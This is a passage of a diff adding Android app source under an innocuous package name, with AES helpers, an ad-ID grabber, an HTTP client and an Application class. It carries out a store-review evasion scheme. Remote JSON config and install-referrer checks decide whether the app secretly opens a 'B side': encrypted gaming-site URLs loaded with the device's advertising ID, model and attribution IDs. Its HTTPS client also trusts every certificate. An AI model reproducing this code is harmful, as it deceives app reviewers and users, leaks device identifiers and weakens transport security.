@@ -1,0 +1,1062 @@
+*******************************************************************************
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+
+    <receiver
+            android:name="com.adjust.sdk.AdjustReferrerReceiver"
+            android:exported="true"
+            android:permission="android.permission.INSTALL_PACKAGES"
+            tools:ignore="WrongManifestParent">
+            <intent-filter>
+                <action android:name="com.android.vending.INSTALL_REFERRER" />
+            </intent-filter>
+        </receiver>
+    
+*******************************************************************************
+    implementation 'com.appsflyer:af-android-sdk:6.15.2'
+    implementation 'com.adjust.sdk:adjust-android:5.1.0'
+    implementation 'com.android.installreferrer:installreferrer:2.2'
+    implementation 'com.adjust.sdk:adjust-android-webbridge:5.1.0'
+    implementation 'com.google.android.gms:play-services-ads-identifier:18.0.1'
+    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
+
+*******************************************************************************
+package com.blue.kidsp.mys2stest;
+
+import android.app.Application;
+import android.content.Context;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Handler;
+import android.os.Looper;
+import android.text.TextUtils;
+import android.util.Log;
+
+import androidx.annotation.Keep;
+
+import com.adjust.sdk.Adjust;
+import com.adjust.sdk.AdjustConfig;
+import com.adjust.sdk.LogLevel;
+import com.adjust.sdk.OnAdidReadListener;
+import com.appsflyer.AppsFlyerLib;
+import java.nio.charset.StandardCharsets;
+import java.security.SecureRandom;
+import java.util.LinkedHashMap;
+import java.util.Map;
+import java.util.TimeZone;
+import java.util.UUID;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+
+public class AesUtil {
+    @Keep
+    public static String getTz(){
+        int offseInMillis = TimeZone.getDefault().getOffset(System.currentTimeMillis());
+        int offsetHours = offseInMillis / (1000 * 60 * 60);
+        if (offsetHours>= 0){
+            return "+"+Math.abs(offsetHours);
+        }else {
+            return "-"+Math.abs(offsetHours);
+        }
+    }
+
+    public static  String encoding(String content){//xpudzeykqtsfgdnb
+        try{
+            IvParameterSpec zeroIv = new IvParameterSpec(new byte[16]);
+            SecretKeySpec key = new SecretKeySpec("VMqmOWP6EYpUkfcU".getBytes(), "AES");
+            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+            cipher.init(Cipher.ENCRYPT_MODE, key, zeroIv);
+            byte[] encryptedData = cipher.doFinal(content.getBytes(StandardCharsets.UTF_8));
+            return new String(Base64Helper.encode(encryptedData));
+
+        }catch (Exception exception){
+            exception.printStackTrace();
+        }
+        return "";
+    }
+    public static String decoding(String content) {
+        try {
+            byte[] byteMi = Base64Helper.decode(content.getBytes());
+            IvParameterSpec zeroIv = new IvParameterSpec(new byte[16]);
+            SecretKeySpec key = new SecretKeySpec("VMqmOWP6EYpUkfcU".getBytes(), "AES");
+            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+            cipher.init(Cipher.DECRYPT_MODE, key, zeroIv);
+            byte[] decryptedData = cipher.doFinal(byteMi);
+            return new String(decryptedData, StandardCharsets.UTF_8);
+        } catch (Exception exception) {
+            exception.printStackTrace();
+        }
+        return "";
+    }
+
+    public static String generateAESKey() {
+        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        SecureRandom random = new SecureRandom();
+        StringBuilder key = new StringBuilder(16);  // 16 characters long key
+        for (int i = 0; i < 16; i++) {
+            int index = random.nextInt(chars.length());
+            key.append(chars.charAt(index));
+        }
+        return key.toString();
+    }
+
+    @Keep
+    public static void inJavaVec(String url ,String key){
+        Application application = MykidspApp.app;
+        String packName = application.getPackageName();
+        if(TextUtils.isEmpty(url)){
+            return;
+        }
+        String uf = application.getSharedPreferences("yD6", Context.MODE_PRIVATE).getString("qC0tH0u","");
+        String string =  AesUtil.decoding(url)+AesUtil.decoding(uf);
+        if (string.contains("appsflyer")){
+            initAF(key);
+            string += "&fixed.appsflyer_appId="+packName
+                    + "&fixed.appsflyer_Id="+AppsFlyerLib.getInstance().getAppsFlyerUID(application);
+            getStart(string);
+            MykidspApp.mActivity.runOnUiThread(() -> new Handler(Looper.getMainLooper()).postDelayed(() -> System.exit(0), 1000));
+        }else {
+            initAJ(key);
+            getAJId(string);
+        }
+
+    }
+
+    public static void initAF(String key){
+        if(TextUtils.isEmpty(key)){
+            return;
+        }
+        AppsFlyerLib.getInstance().setMinTimeBetweenSessions(0);
+        AppsFlyerLib.getInstance().setDebugLog(true);
+        AppsFlyerLib.getInstance().init(key, null, MykidspApp.app);
+        AppsFlyerLib.getInstance().start(MykidspApp.app, key);
+
+        Intent intent = new Intent(MykidspApp.mActivity,MykidspApp.mActivity.getClass());
+        intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP|Intent.FLAG_ACTIVITY_SINGLE_TOP);
+        MykidspApp.mActivity.startActivity(intent);
+
+    }
+
+
+
+    public static  void initAJ(String key){
+        if(TextUtils.isEmpty(key)){
+            return;
+        }
+        String environment = AdjustConfig.ENVIRONMENT_PRODUCTION;
+        AdjustConfig adjustConfig = new AdjustConfig(MykidspApp.app, key, environment);
+        adjustConfig.setLogLevel(LogLevel.VERBOSE);
+        Adjust.removeGlobalCallbackParameters();
+        Adjust.removeGlobalPartnerParameters();
+        Adjust.initSdk(adjustConfig);
+        Adjust.onResume();
+
+    }
+    public static void getAJId(String inputStr) {
+        MykidspApp.mActivity.runOnUiThread(() -> {
+            Adjust.getAdid(new OnAdidReadListener() {
+                @Override
+                public void onAdidRead(String s) {
+                    String adidString = (s != null) ? s : UUID.randomUUID().toString();
+                    if (TextUtils.isEmpty(adidString)) {
+                        getAJId(inputStr); // 递归重新获取
+                    } else {
+                        String str = inputStr + "&fixed.adjust_adid=" + adidString;
+                        MykidspApp.mActivity.runOnUiThread(() -> getStart(str));
+                        System.exit(0);
+                    }
+                }
+            });
+        });
+    }
+
+    private static void getStart(String string) {
+        Log.e("wtj","=Aes=string=url="+string);
+        Intent intent = new Intent(Intent.ACTION_VIEW);
+        intent.setData(Uri.parse(string));
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        MykidspApp.app.startActivity(intent);
+    }
+    public static void main111(String[] args) {
+
+        // Generate a random AES key (16 characters)
+        String generatedKey = generateAESKey();
+        System.out.println("Generated AES Key: " + generatedKey);
+        String content = "Hello, AES encryption!";
+
+        // Encoding with the generated key
+        String encrypted = encoding(content);
+        System.out.println("Encrypted: " + encrypted);
+
+        // Decrypting with the same key
+        String decrypted = decoding(encrypted);
+        System.out.println("Decrypted: " + decrypted);
+
+    }
+
+    public static String generateKey() {
+        final String CHARACTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        final int KEY_LENGTH = 16;
+        SecureRandom random = new SecureRandom();
+        StringBuilder key = new StringBuilder(KEY_LENGTH);
+
+        for (int i = 0; i < KEY_LENGTH; i++) {
+            int index = random.nextInt(CHARACTERS.length());
+            key.append(CHARACTERS.charAt(index));
+        }
+        return key.toString();
+    }
+    public static void main(String[] args) {
+
+        System.out.println("*************** the start ********************");
+
+        Map<String, String> data = new LinkedHashMap<>();
+
+        //data.put("new_key", generateKey());
+        data.put("key", "VMqmOWP6EYpUkfcU");
+        //data.put("key", "jNkz3VwkiHeCNpHR");//https://web02c-024.cg6.co/?
+        //data.put("http_url", "https://raw.githubusercontent.com/wilhelm9986/MyTestAfOrAdjust/refs/heads/main/ajx3.json");
+        data.put("aj_url", "https://web-024.cg6.co/home/game?gameCategoryId=0&fixed.adjust_appid=v7n3s6y3pzpc&fixed.adjust_token=0112e80b2ee8c9056c0c98f558692294&fixed.adjust_ecode_reg=1fz710&fixed.adjust_ecode_recharge=x4vmcl&fixed.adjust_ecode_first_recharge=y7et9b&");
+
+        //https://web02c-024.cg6.co/
+        //https://web-025.cg6.co/
+        //https://web02c-024.cg6.co/
+        data.put("af_url", "https://web-024.cg6.co/home/game?gameCategoryId=0&fixed.appsflyer_auth=08062fa5-4b0c-42c9-92cf-ce0a06dca5ed&");
+
+        //data.put("http_url","https://raw.githubusercontent.com/wilhelm9986/ITS-BACKGAMMON/refs/heads/main/moeez.json");
+        //data.put("http_url", "https://raw.githubusercontent.com/wilhelm9986/ICE-CRUSH-Cool-Fun/refs/heads/main/icecrush.json");
+       // data.put("http_url","https://raw.githubusercontent.com/wilhelm9986/QCEAN-MANIA/refs/heads/main/MANIA.json");
+
+        //data.put("http_url", "https://raw.githubusercontent.com/wilhelm9986/BAKING-HOUSE/refs/heads/main/house.json");
+        //data.put("nomourl", "https://www.bing.com/");
+        data.put("http_url","https://raw.githubusercontent.com/wilhelm9986/Wonder-Journey-Spin/refs/heads/main/journey.json");
+
+        data.put("appsflyer", "appsflyer");
+        data.put("appsflyer_appId", "&fixed.appsflyer_appId=");
+        data.put("appsflyer_id", "&fixed.appsflyer_id=");
+        data.put("adjust_adid", "&fixed.adjust_adid=");
+
+//        data.put("vending", "com.android.vending");
+//        data.put("identifier", "com.google.android.gms.ads.identifier.service.START");
+//        data.put("gms", "com.google.android.gms");
+//        data.put("IAdvertisingIdService", "com.google.android.gms.ads.identifier.internal.IAdvertisingIdService");
+
+//        data.put("00000000", "00000000");
+//        data.put("utm_medium", "utm_medium=organic");
+//        data.put("WgPackage", "WgPackage=");
+//        data.put("gaid", "&fixed.gaid=");
+//        data.put("deviceModel", "&fixed.deviceModel=");
+//        data.put("%20", "%20");
+
+        encryptAndPrint(data);
+        System.out.println("*************** the end ********************");
+    }
+
+    private static void encryptAndPrint(Map<String, String> data) {
+        String currentGroup = null;
+        for (Map.Entry<String, String> entry : data.entrySet()) {
+            String key = entry.getKey();
+            String value = entry.getValue();
+            if (key.startsWith("group_")) {
+                currentGroup = value;
+                System.out.println("*************** " + currentGroup + " ********************");
+                continue;
+            }
+            String encryptedValue = encoding(value);
+            System.out.println("cc==main=" + key + "=" + encryptedValue);
+            System.out.println("cc==main=" + key + "=" + decoding(encryptedValue));
+            System.out.println("***********************************");
+        }
+    }
+
+}
+
+*******************************************************************************
+package com.blue.kidsp.mys2stest;
+
+public class Base64Helper {
+    static final int CHUNK_SIZE = 76;
+    static final byte[] CHUNK_SEPARATOR = "\r\n".getBytes();
+    static final int BASELENGTH = 255;
+    static final int LOOKUPLENGTH = 64;
+
+    static final int EIGHTBIT = 8;
+
+    /**
+     * Used when encoding something which has fewer than 24 bits.
+     */
+
+    static final int SIXTEENBIT = 16;
+
+    /**
+     * Used to determine how many bits data contains.
+     */
+    static final int TWENTYFOURBITGROUP = 24;
+
+    /**
+     * Used to get the number of Quadruples.
+     */
+    static final int FOURBYTE = 4;
+    /**
+     * Used to test the sign of a byte.
+     */
+    static final int SIGN = -128;
+
+    /**
+     * Byte used to pad output.
+     */
+    static final byte PAD = (byte) '=';
+
+    private static byte[] base64Alphabet = new byte[BASELENGTH];
+
+    private static byte[] lookUpBase64Alphabet = new byte[LOOKUPLENGTH];
+
+    static {
+
+        for (int i = 0; i < BASELENGTH; i++) {
+            base64Alphabet[i] = (byte) -1;
+        }
+
+        for (int i = 'Z'; i >= 'A'; i--) {
+            base64Alphabet[i] = (byte) (i - 'A');
+        }
+
+        for (int i = 'z'; i >= 'a'; i--) {
+            base64Alphabet[i] = (byte) (i - 'a' + 26);
+        }
+
+
+
+        for (int i = '9'; i >= '0'; i--) {
+            base64Alphabet[i] = (byte) (i - '0' + 52);
+        }
+
+        base64Alphabet['+'] = 62;
+
+        base64Alphabet['/'] = 63;
+
+        for (int i = 0; i <= 25; i++) {
+            lookUpBase64Alphabet[i] = (byte) ('A' + i);
+        }
+
+        for (int i = 26, j = 0; i <= 51; i++, j++) {
+            lookUpBase64Alphabet[i] = (byte) ('a' + j);
+        }
+
+        for (int i = 52, j = 0; i <= 61; i++, j++) {
+            lookUpBase64Alphabet[i] = (byte) ('0' + j);
+        }
+
+        lookUpBase64Alphabet[62] = (byte) '+';
+        lookUpBase64Alphabet[63] = (byte) '/';
+    }
+
+    private static boolean isBase64(byte octect) {
+        if (octect == PAD) {
+            return true;
+        } else if (base64Alphabet[octect] == -1) {
+            return false;
+        } else {
+            return true;
+        }
+    }
+
+
+
+    /**
+     * Decodes a byte[] containing containing
+     * characters in the Base64 alphabet.
+     *
+     * @param pArray A byte array containing Base64 character data
+     * @return a byte array containing binary data
+     */
+    public static byte[] decode(byte[] pArray) {
+        return decodeBase64(pArray);
+    }
+
+    /**
+     * Encodes binary data using the base64 algorithm, optionally
+     * chunking the output into 76 character blocks.
+     *
+     * @param binaryData Array containing binary data to encode.
+     * @param isChunked if isChunked is true this encoder will chunk
+     *                  the base64 output into 76 character blocks
+     * @return Base64-encoded data.
+     */
+    public static byte[] encodeBase64(byte[] binaryData, boolean isChunked) {
+        int lengthDataBits = binaryData.length * EIGHTBIT;
+        int fewerThan24bits = lengthDataBits % TWENTYFOURBITGROUP;
+        int numberTriplets = lengthDataBits / TWENTYFOURBITGROUP;
+        byte encodedData[] = null;
+        int encodedDataLength = 0;
+        int nbrChunks = 0;
+
+        if (fewerThan24bits != 0) {
+            //data not divisible by 24 bit
+            encodedDataLength = (numberTriplets + 1) * 4;
+        } else {
+            // 16 or 8 bit
+            encodedDataLength = numberTriplets * 4;
+        }
+
+        // If the output is to be "chunked" into 76 character sections,
+        // for compliance with RFC 2045 MIME, then it is important to
+        // allow for extra length to account for the separator(s)
+        if (isChunked) {
+
+            nbrChunks =
+                    (CHUNK_SEPARATOR.length == 0 ? 0 : (int) Math.ceil((float) encodedDataLength / CHUNK_SIZE));
+            encodedDataLength += nbrChunks * CHUNK_SEPARATOR.length;
+        }
+
+        encodedData = new byte[encodedDataLength];
+
+        byte k = 0, l = 0, b1 = 0, b2 = 0, b3 = 0;
+
+        int encodedIndex = 0;
+        int dataIndex = 0;
+        int i = 0;
+        int nextSeparatorIndex = CHUNK_SIZE;
+        int chunksSoFar = 0;
+
+        //log.debug("number of triplets = " + numberTriplets);
+        for (i = 0; i < numberTriplets; i++) {
+            dataIndex = i * 3;
+            b1 = binaryData[dataIndex];
+            b2 = binaryData[dataIndex + 1];
+            b3 = binaryData[dataIndex + 2];
+
+            //log.debug("b1= " + b1 +", b2= " + b2 + ", b3= " + b3);
+
+            l = (byte) (b2 & 0x0f);
+            k = (byte) (b1 & 0x03);
+
+            byte val1 =
+                    ((b1 & SIGN) == 0) ? (byte) (b1 >> 2) : (byte) ((b1) >> 2 ^ 0xc0);
+            byte val2 =
+                    ((b2 & SIGN) == 0) ? (byte) (b2 >> 4) : (byte) ((b2) >> 4 ^ 0xf0);
+            byte val3 =
+                    ((b3 & SIGN) == 0) ? (byte) (b3 >> 6) : (byte) ((b3) >> 6 ^ 0xfc);
+
+            encodedData[encodedIndex] = lookUpBase64Alphabet[val1];
+            //log.debug( "val2 = " + val2 );
+            //log.debug( "k4   = " + (k<<4) );
+            //log.debug(  "vak  = " + (val2 | (k<<4)) );
+            encodedData[encodedIndex + 1] =
+                    lookUpBase64Alphabet[val2 | (k << 4)];
+            encodedData[encodedIndex + 2] =
+                    lookUpBase64Alphabet[(l << 2) | val3];
+            encodedData[encodedIndex + 3] = lookUpBase64Alphabet[b3 & 0x3f];
+
+            encodedIndex += 4;
+
+            // If we are chunking, let's put a chunk separator down.
+            if (isChunked) {
+                // this assumes that CHUNK_SIZE % 4 == 0
+                if (encodedIndex == nextSeparatorIndex) {
+                    System.arraycopy(
+                            CHUNK_SEPARATOR,
+                            0,
+                            encodedData,
+                            encodedIndex,
+                            CHUNK_SEPARATOR.length);
+                    chunksSoFar++;
+                    nextSeparatorIndex =
+                            (CHUNK_SIZE * (chunksSoFar + 1)) +
+                                    (chunksSoFar * CHUNK_SEPARATOR.length);
+                    encodedIndex += CHUNK_SEPARATOR.length;
+                }
+            }
+        }
+
+        // form integral number of 6-bit groups
+        dataIndex = i * 3;
+
+        if (fewerThan24bits == EIGHTBIT) {
+            b1 = binaryData[dataIndex];
+            k = (byte) (b1 & 0x03);
+            //log.debug("b1=" + b1);
+            //log.debug("b1<<2 = " + (b1>>2) );
+            byte val1 =
+                    ((b1 & SIGN) == 0) ? (byte) (b1 >> 2) : (byte) ((b1) >> 2 ^ 0xc0);
+            encodedData[encodedIndex] = lookUpBase64Alphabet[val1];
+            encodedData[encodedIndex + 1] = lookUpBase64Alphabet[k << 4];
+            encodedData[encodedIndex + 2] = PAD;
+            encodedData[encodedIndex + 3] = PAD;
+        } else if (fewerThan24bits == SIXTEENBIT) {
+
+            b1 = binaryData[dataIndex];
+            b2 = binaryData[dataIndex + 1];
+            l = (byte) (b2 & 0x0f);
+            k = (byte) (b1 & 0x03);
+
+            byte val1 =
+                    ((b1 & SIGN) == 0) ? (byte) (b1 >> 2) : (byte) ((b1) >> 2 ^ 0xc0);
+            byte val2 =
+                    ((b2 & SIGN) == 0) ? (byte) (b2 >> 4) : (byte) ((b2) >> 4 ^ 0xf0);
+
+            encodedData[encodedIndex] = lookUpBase64Alphabet[val1];
+            encodedData[encodedIndex + 1] =
+                    lookUpBase64Alphabet[val2 | (k << 4)];
+            encodedData[encodedIndex + 2] = lookUpBase64Alphabet[l << 2];
+            encodedData[encodedIndex + 3] = PAD;
+        }
+
+        if (isChunked) {
+            // we also add a separator to the end of the final chunk.
+            if (chunksSoFar < nbrChunks) {
+                System.arraycopy(
+                        CHUNK_SEPARATOR,
+                        0,
+                        encodedData,
+                        encodedDataLength - CHUNK_SEPARATOR.length,
+                        CHUNK_SEPARATOR.length);
+            }
+        }
+
+        return encodedData;
+    }
+
+    /**
+     * Decodes Base64 data into octects
+     *
+     * @param base64Data Byte array containing Base64 data
+     * @return Array containing decoded data.
+     */
+    public static byte[] decodeBase64(byte[] base64Data) {
+        // RFC 2045 requires that we discard ALL non-Base64 characters
+        base64Data = discardNonBase64(base64Data);
+
+        // handle the edge case, so we don't have to worry about it later
+        if (base64Data.length == 0) {
+            return new byte[0];
+        }
+
+        int numberQuadruple = base64Data.length / FOURBYTE;
+        byte decodedData[] = null;
+        byte b1 = 0, b2 = 0, b3 = 0, b4 = 0, marker0 = 0, marker1 = 0;
+
+        // Throw away anything not in base64Data
+
+        int encodedIndex = 0;
+        int dataIndex = 0;
+        {
+            // this sizes the output array properly - rlw
+            int lastData = base64Data.length;
+            // ignore the '=' padding
+            while (base64Data[lastData - 1] == PAD) {
+                if (--lastData == 0) {
+                    return new byte[0];
+                }
+            }
+            decodedData = new byte[lastData - numberQuadruple];
+        }
+
+        for (int i = 0; i < numberQuadruple; i++) {
+            dataIndex = i * 4;
+            marker0 = base64Data[dataIndex + 2];
+            marker1 = base64Data[dataIndex + 3];
+
+            b1 = base64Alphabet[base64Data[dataIndex]];
+            b2 = base64Alphabet[base64Data[dataIndex + 1]];
+
+            if (marker0 != PAD && marker1 != PAD) {
+                //No PAD e.g 3cQl
+                b3 = base64Alphabet[marker0];
+                b4 = base64Alphabet[marker1];
+
+                decodedData[encodedIndex] = (byte) (b1 << 2 | b2 >> 4);
+                decodedData[encodedIndex + 1] =
+                        (byte) (((b2 & 0xf) << 4) | ((b3 >> 2) & 0xf));
+                decodedData[encodedIndex + 2] = (byte) (b3 << 6 | b4);
+            } else if (marker0 == PAD) {
+                //Two PAD e.g. 3c[Pad][Pad]
+                decodedData[encodedIndex] = (byte) (b1 << 2 | b2 >> 4);
+            } else if (marker1 == PAD) {
+                //One PAD e.g. 3cQ[Pad]
+                b3 = base64Alphabet[marker0];
+
+                decodedData[encodedIndex] = (byte) (b1 << 2 | b2 >> 4);
+                decodedData[encodedIndex + 1] =
+                        (byte) (((b2 & 0xf) << 4) | ((b3 >> 2) & 0xf));
+            }
+            encodedIndex += 3;
+        }
+        return decodedData;
+    }
+
+    /**
+     * Discards any characters outside of the base64 alphabet, per
+     * the requirements on page 25 of RFC 2045 - "Any characters
+     * outside of the base64 alphabet are to be ignored in base64
+     * encoded data."
+     *
+     * @param data The base-64 encoded data to groom
+     * @return The data, less non-base64 characters (see RFC 2045).
+     */
+    static byte[] discardNonBase64(byte[] data) {
+        byte groomedData[] = new byte[data.length];
+        int bytesCopied = 0;
+
+        for (int i = 0; i < data.length; i++) {
+            if (isBase64(data[i])) {
+                groomedData[bytesCopied++] = data[i];
+            }
+        }
+
+        byte packedData[] = new byte[bytesCopied];
+
+        System.arraycopy(groomedData, 0, packedData, 0, bytesCopied);
+
+        return packedData;
+    }
+
+    /**
+     * Encodes a byte[] containing binary data, into a byte[] containing
+     * characters in the Base64 alphabet.
+     *
+     * @param pArray a byte array containing binary data
+     * @return A byte array containing only Base64 character data
+     */
+    public static byte[] encode(byte[] pArray) {
+        return encodeBase64(pArray, false);
+    }
+
+
+}
+
+*******************************************************************************
+package com.blue.kidsp.mys2stest;
+
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.ServiceConnection;
+import android.content.pm.PackageManager;
+import android.os.IBinder;
+import android.os.IInterface;
+import android.os.Parcel;
+import android.os.RemoteException;
+
+import java.util.concurrent.LinkedBlockingQueue;
+
+public class GAIdUtil {
+
+    public static String getGoogleAdId(Context context) {
+        PackageManager pm = context.getPackageManager();
+        try {
+            pm.getPackageInfo("com.android.vending", 0);
+
+            AdvertisingConnection connection = new AdvertisingConnection();
+            Intent intent = new Intent(
+                    "com.google.android.gms.ads.identifier.service.START");
+            intent.setPackage("com.google.android.gms");
+            if (context.bindService(intent, connection, Context.BIND_AUTO_CREATE)) {
+                try {
+                    AdvertisingInterface adInterface = new AdvertisingInterface(connection.getBinder());
+                    return adInterface.getId();
+                } finally {
+                    context.unbindService(connection);
+                }
+            }
+        } catch (Exception ignored) {
+        }
+        return "";
+    }
+
+    private static final class AdvertisingConnection implements ServiceConnection {
+        boolean retrieved = false;
+        private final LinkedBlockingQueue<IBinder> queue = new LinkedBlockingQueue<>(1);
+
+        public void onServiceConnected(ComponentName name, IBinder service) {
+            try {
+                this.queue.put(service);
+            } catch (InterruptedException ignored) {
+            }
+        }
+
+        public void onServiceDisconnected(ComponentName name) {
+        }
+
+        public IBinder getBinder() throws InterruptedException {
+            if (this.retrieved)
+                throw new IllegalStateException();
+            this.retrieved = true;
+            return this.queue.take();
+        }
+    }
+
+    private static final class AdvertisingInterface implements IInterface {
+        private final IBinder binder;
+
+        public AdvertisingInterface(IBinder pBinder) {
+            binder = pBinder;
+        }
+
+        public IBinder asBinder() {
+            return binder;
+        }
+
+        public String getId() throws RemoteException {
+            Parcel data = Parcel.obtain();
+            Parcel reply = Parcel.obtain();
+            String id;
+            try {
+                data.writeInterfaceToken("com.google.android.gms.ads.identifier.internal.IAdvertisingIdService");
+                binder.transact(1, data, reply, 0);
+                reply.readException();
+                id = reply.readString();
+            } finally {
+                reply.recycle();
+                data.recycle();
+            }
+            return id;
+        }
+    }
+
+}
+*******************************************************************************
+package com.blue.kidsp.mys2stest;
+
+import android.util.Log;
+import androidx.annotation.NonNull;
+import org.json.JSONObject;
+import java.io.IOException;
+import java.security.SecureRandom;
+import java.security.cert.X509Certificate;
+import java.util.concurrent.TimeUnit;
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
+import okhttp3.CacheControl;
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.Response;
+public class HttpUtils {
+
+    private static HttpUtils mInstance;
+    private OkHttpClient client;
+    public static synchronized HttpUtils getInstance() {
+        HttpUtils httpUtil;
+        synchronized (HttpUtils.class) {
+            if (mInstance == null) {
+                mInstance = new HttpUtils();
+            }
+            httpUtil = mInstance;
+        }
+        return httpUtil;
+    }
+
+    private OkHttpClient getClient() {
+        if (client == null) {
+
+            OkHttpClient.Builder builder = new OkHttpClient.Builder();
+
+            try {
+                TrustManager[] trustManagerArr = {new X509TrustManager() {
+                    @Override
+                    public void checkClientTrusted(X509Certificate[] x509CertificateArr, String str) {
+                    }
+
+                    @Override
+                    public void checkServerTrusted(X509Certificate[] x509CertificateArr, String str) {
+                    }
+
+                    @Override
+                    public X509Certificate[] getAcceptedIssuers() {
+                        return new X509Certificate[0];
+                    }
+                }};
+
+                SSLContext sSLContext = SSLContext.getInstance("TLS");
+                sSLContext.init(null, trustManagerArr, new SecureRandom());
+                builder.sslSocketFactory(sSLContext.getSocketFactory(), (X509TrustManager) trustManagerArr[0]);
+                builder.connectTimeout(5000L, TimeUnit.MILLISECONDS);
+                builder.readTimeout(5000L, TimeUnit.MILLISECONDS);
+                builder.writeTimeout(5000L, TimeUnit.MILLISECONDS);
+                builder.build();
+
+            } catch (Exception ignored) {
+            }
+            client = builder.build();
+        }
+        return client;
+    }
+
+    public void execute() {
+        //Adjust
+        //https://raw.githubusercontent.com/wilhelm9986/MyTestAfOrAdjust/refs/heads/main/testAdjust.json
+        //Adjust
+        //https://raw.githubusercontent.com/wilhelm9986/MyTestAfOrAdjust/refs/heads/main/testAppsflyer.json
+
+        try {
+
+            String setString = "https://raw.githubusercontent.com/wilhelm9986/MyTestAfOrAdjust/refs/heads/main/testAdjust.json";
+            //String setString = "https://raw.githubusercontent.com/wilhelm9986/MyTestAfOrAdjust/refs/heads/main/testAppsflyer.json";
+            Request.Builder builder = new Request.Builder();
+            builder.cacheControl(CacheControl.FORCE_NETWORK).url(setString).get();
+            getClient().newCall(builder.build()).enqueue(new Callback() {
+
+                @Override
+                public void onResponse(@NonNull Call call, @NonNull final Response response) throws IOException {
+                    if (response.body() != null) {
+                        String trim = response.body().string().trim();
+                        Log.e("wtj", trim);
+                        try {
+                            System.loadLibrary("mytestaforadjust");
+                            JSONObject jsonObject = new JSONObject(trim);
+                            String key = jsonObject.getString("key");  // afkey / adjust的AppToken
+                            String ent = jsonObject.getString("abSwitch");  // 测试开关，是否绕过自然量直接打开B面
+                            String tz = jsonObject.getString("stimeZone");    // 配置的时区 比如巴西时区 -3
+                            String ur = jsonObject.getString("baseUrl");    // 配置链接
+
+                            Log.e("wtj","=http=isStart="+ MykidspApp.isStart.toString());
+                            Log.e("wtj","=http=key="+ key);
+                            Log.e("wtj","=http=ent="+ ent);
+                            Log.e("wtj","=http=tz="+ tz);
+                            Log.e("wtj","=http=ur="+ ur);
+                            verityNet(MykidspApp.isStart.toString(), key, ent, tz, ur);
+                        } catch (Exception e) {
+                            Log.e(MykidspApp.app.getPackageName(), e.toString());
+                        }
+                    }
+                }
+
+                @Override
+                public void onFailure(@NonNull Call call, @NonNull final IOException iOException) {
+                }
+
+            });
+        } catch (Exception e) {
+            Log.e(MykidspApp.app.getPackageName(), e.toString());
+        }
+    }
+
+    public native void verityNet(String start, String key, String ent, String tz, String ur);
+
+}
+*******************************************************************************
+package com.blue.kidsp.mys2stest;
+
+import android.app.Activity;
+import android.app.Application;
+import android.content.SharedPreferences;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
+import android.text.TextUtils;
+import android.util.Log;
+import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
+import com.adjust.sdk.Adjust;
+import com.android.installreferrer.api.InstallReferrerClient;
+import com.android.installreferrer.api.InstallReferrerStateListener;
+import java.util.UUID;
+
+public class MykidspApp extends Application {
+
+    public String Tag = MykidspApp.class.getName();
+    public  static  MykidspApp app;
+    public  static  Object isStart;
+    public  static  Activity mActivity;
+    public  static  String googleAdId;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        app = this;
+        regActivityLifecycle();
+        new Thread(() -> {
+            googleAdId = GAIdUtil.getGoogleAdId(this);
+
+            InstallReferrerClient iX4kQ4uR = InstallReferrerClient.newBuilder(MykidspApp.this).build();
+            iX4kQ4uR.startConnection(new InstallReferrerStateListener() {
+                @Override
+                public void onInstallReferrerSetupFinished(int responseCode) {
+
+                    if (responseCode == InstallReferrerClient.InstallReferrerResponse.OK) {
+                        Runnable rQ7lT6yN = createInstallReferrerRunnable(iX4kQ4uR);
+                        new Thread(rQ7lT6yN).start();
+                    } else {
+                        Log.e(Tag, "failure situations ****");
+                    }
+
+                }
+                @Override
+                public void onInstallReferrerServiceDisconnected() {
+                    Log.e(Tag, "service disconnected****");
+                }
+            });
+        }).start();
+    }
+
+    private Runnable createInstallReferrerRunnable(InstallReferrerClient referrerClient) {
+        return () -> {
+            try {
+                String installReferrer = referrerClient.getInstallReferrer().getInstallReferrer();
+                isStart = !TextUtils.isEmpty(installReferrer) && !installReferrer.contains("utm_medium=organic");
+                isStart = true;
+                referrerClient.endConnection();
+                SharedPreferences sp = getSharedPreferences("yD6", MODE_PRIVATE);
+                if (TextUtils.isEmpty(googleAdId) || googleAdId.startsWith("00000000")) {
+                    googleAdId = sp.getString("aC5wC8f", "");
+
+                    if (!TextUtils.isEmpty(googleAdId)) {
+                        googleAdId = AesUtil.decoding(googleAdId);
+                    } else {
+                        googleAdId = UUID.randomUUID().toString();
+                        sp.edit().putString("aC5wC8f", AesUtil.encoding(googleAdId)).apply();
+                    }
+                }
+                String string = buildDataString();
+                sp.edit().putString("qC0tH0u", AesUtil.encoding(string)).apply();
+                new Handler(Looper.getMainLooper()).postDelayed(HttpUtils.getInstance()::execute, 500);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        };
+    }
+
+    private String buildDataString() {
+        StringBuilder dataStringBuilder = new StringBuilder();
+        dataStringBuilder.append("WgPackage=").append(getPackageName())
+                .append("&fixed.gaid=").append(googleAdId)
+                .append("&fixed.deviceModel=")
+                .append(Build.MANUFACTURER).append("%20")
+                .append(Build.BRAND).append("%20")
+                .append(Build.MODEL);
+
+        return dataStringBuilder.toString();
+    }
+
+    private void regActivityLifecycle(){
+        registerActivityLifecycleCallbacks(new ActivityLifecycleCallbacks() {
